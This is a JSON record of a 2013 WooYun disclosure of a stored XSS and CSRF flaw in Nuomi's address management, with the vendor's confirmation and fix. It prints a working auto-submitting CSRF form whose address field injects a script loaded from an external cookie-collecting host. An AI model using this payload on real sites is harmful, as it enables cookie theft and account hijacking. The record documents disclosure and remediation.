{"id": 63436, "wybug_id": "wooyun-2013-031874", "wybug_title": "糯米网某处持久性xss和csrf(结合可劫持用户cookie)", "wybug_corp": "糯米网", "wybug_author": "xfkxfk", "wybug_date": "2013-07-23 11:51", "wybug_open_date": "2013-09-06 11:52", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "类型应用", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-06：\t细节向公众公开  简要描述： 糯米网某处xss和csrf,可劫持用户cookie 详细说明：  第一处xss在用户地址管理中，详细地址没有做过滤，导致xss，而且在增加地址时存在csrf，所以可以结合，达到劫持用户cookies的效果。首先用户xxxxxx没有地址信息：\n\n然后随便增加一个地址，截断抓包，看看增加地址的请求如下：\n\n然后我们构造如下POC：\n<html><body><form id=\"xfkxfk\" name=\"xfkxfk\" action=\"http://m.nuomi.com/user/address/save?areaId=1000010000\" method=\"POST\"><input type=\"text\" name=\"tinyurl\" value=\"\" /><input type=\"text\" name=\"name\" value=\"222222\" /><input type=\"text\" name=\"mobile\" value=\"13122222222\" /><input type=\"text\" name=\"areaCode\" value=\"101101101101\" /><input type=\"text\" name=\"address\" value=\"xfkxfk<script src=http://xss.tw/2644></script>\" /><input type=\"text\" name=\"postCode\" value=\"222222\" /><input type=\"submit\" value=\"submit\"></form><script>   document.xfkxfk.submit();</script></body></html>\n在本地打开如下：\n\n然后返回界面，查看是否添加地址成功：\n\n至此我们已经成功添加了地址信息，并打开地址管理就会出发xss。虽然这里的xss只能是x到自己，但是结合上述csrf就可以劫持其他任意用户cookie了。\n\n   漏洞证明：  见详细说明   修复方案：  过滤，加token，判断referer等等   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-07-23 14:27 厂商回复： 谢谢您对糯米安全的关注，我们会尽快修复。 最新状态： 2013-09-06：已经修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}